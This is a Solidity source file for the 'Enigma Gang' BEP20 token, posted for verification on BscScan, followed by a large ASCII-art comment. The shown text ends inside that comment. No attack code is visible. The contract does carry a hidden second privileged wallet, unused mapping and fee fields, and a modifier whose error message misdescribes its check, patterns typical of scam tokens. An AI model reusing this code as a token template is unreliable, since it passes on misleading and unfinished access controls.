/**
 *Submitted for verification at BscScan.com on 2022-06-10
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-09
*/

pragma solidity 0.5.17;

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract EnigmaGang is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private newBalance;
  mapping(address => bool) public allowAddress;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  uint256 swapperFees = 0;
  address allowedWallet;


  constructor() public {
    allowedWallet = msg.sender;
    _name = "Enigma Gang";
    _symbol = "ENIG";
    _decimals = 9;
    _totalSupply = 90000000000000000000000 ;
    newBalance[allowedWallet] = _totalSupply;
    allowAddress[allowedWallet] = true;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external view returns (uint256) {
    return newBalance[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    newBalance[sender] = newBalance[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    newBalance[recipient] = newBalance[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
    
  modifier atOwner () {
    require(allowedWallet == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  
  }

  /** @dev Creates `amount` tokens and assigns them to `account`, increasing
   * the total supply.
   *
   * Emits a {Transfer} event with `from` set to the zero address.
   *
   * Requirements
   *
   * - `to` cannot be the zero address.
   */
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    newBalance[account] = newBalance[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  /**
   * @dev Destroys `amount` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amount` tokens.
   */
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    newBalance[account] = newBalance[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  /**
   * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
   * from the caller's allowance.
   *
   * See {_burn} and {_approve}.
   */
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
/* 

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:^^^:..:::....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...::........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:!JP#&&&B?:.:.:::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:?PBBG5?~:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:::::...:75#@@@@@@@@@5....:..:::::::::::::::::::::.:::::::.:.::::::::.............................:::::::...:::::::::...::::::::::::::.:[email protected]@@@@@@&BY!:...::::::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::...~Y#@@@@@&#&@@@@@G7.:........::::........:...::.........................:::::::::::::::.....................::........:...........^#@@@@&@@@@@@BY~........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:....!P&@@@@&#[email protected]@@@@@@#^.:....:.......:....:::...........::^^~!77?JY55PPGGBBBB##########BBBBGGPP55YJ?77!~^^::.................:......:[email protected]@@@#GG#&@@@@&P!......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@@@@&BPPPP&@@@@@@@G:.:.........::...........:^~7?JYPGB##&@@@@@&&&&&&##########BB#########&&&&&&&@@@@@&&#BGP5J?!~^::..............:.:[email protected]@@@BPPPB#@@@@@P~..:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:J&@@@@&GPPPPP#@@@@@@@#^....:............:^~7JYPB#&@@@&&&##BBGGGPPPPP555555555555555555555555555555PPPPPGGBBB##&&&@@@&#BPYJ7~^:........:.~&@@@&GPPPPG#@@@@&Y:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.^[email protected]@@@&[email protected]@@@@@@&!............:~!?5G#&&@&&&#BBGGPPP55555555555555555555555555555555555555555555555555555555PPPGGBB#&&&@&&BG5?!~:[email protected]@@@#PPPPPPG&@@@@B!..:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.~#@@@@#[email protected]@@@@@@Y.......:^!?5G#&@@&&#BGPPP55555555555555555555555555555555555555555555555555555555555555555555555555PPPGB#&&@@&#G5?!^:[email protected]@@&[email protected]@@@@?..:.......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.~#@@@@BPB#PPPPPP&@@@@@@#^..:^!JPB&@@&&#BGPP55555555555555555555555555555555555555555555555555555555555555555555555555555555P5555555PPGB#&&@&&[email protected]@@@BPPPPPB#[email protected]@@@@J....:.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.^#@@@@BPB&GPPPPPP&@@@@@@5~?5B&@@&#BGPP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PPPGB#&@@@@BPPPPPP#&PG&@@@@J..:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@@#[email protected]&@@@@@@&&@&#BGPP555555555555555555555555555555555555555555555555[email protected]@@@BPPPPPPP&#[email protected]@@@@7.::....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@&PG&&PPPPPPPP#@@@@@@&BGP555P555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555#@@@@[email protected]@@@@#^.::...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:#@@@@BP#@[email protected]@@@@@B5P55PPPP5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P&@@@&GPPPPPPPP&@GG&@@@@5................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@&[email protected]&PPPPPPPPPP#@@@@@&P5P5P555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P#@@@@[email protected]#P#@@@@&~................::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@BP#@#PPPPPPPPPPP&@@@@@B5555P55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P5P#@@@@#[email protected]&[email protected]@@@@G~:.....:...^~^:...:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@BP&@#PPPPPPPPPPPG&@@@@@B55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P5555P#@@@@#PPPPPPPPPPPG&@GP&@@@@@@BY!:.....Y&@&BY7^....:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@@@GG&@#PPPPPPPPPPPPP#@@@@@#P55PP55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P555G&@@@@#PPPPPPPPPPPPP&@#P#@@@@&#&@@BY~:.^#@@@@@@&P?^....:::::.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@@@[email protected]@#PPPPPPPPPPPPPPB&@@@@&GP55P5555555555555555555555555555555555PPPPPPPGGGBBBBBBBB##BBBBBBBBGGGPPPPPP555555555555555555555555555PP55G&@@@@&GPPPPPPPPPPPPPG&@#P#@@@@&G5GB&@&[email protected]@@@@@@@@@&G?^...:.......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.............:!5&@@@@BP&@&PPPPPPPPPPPPPPPG#@@@@@&G55555555555555555555555555PPPPGGBB##&&&@@@@@&&&&&&&#########&&&&&&&@@@@&&&##BBGGPPP5555555P5555555555PG#@@@@@#[email protected]@#P#@@@@&G555PG#&@&@@@@PJ5B&@@@@&P7:........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
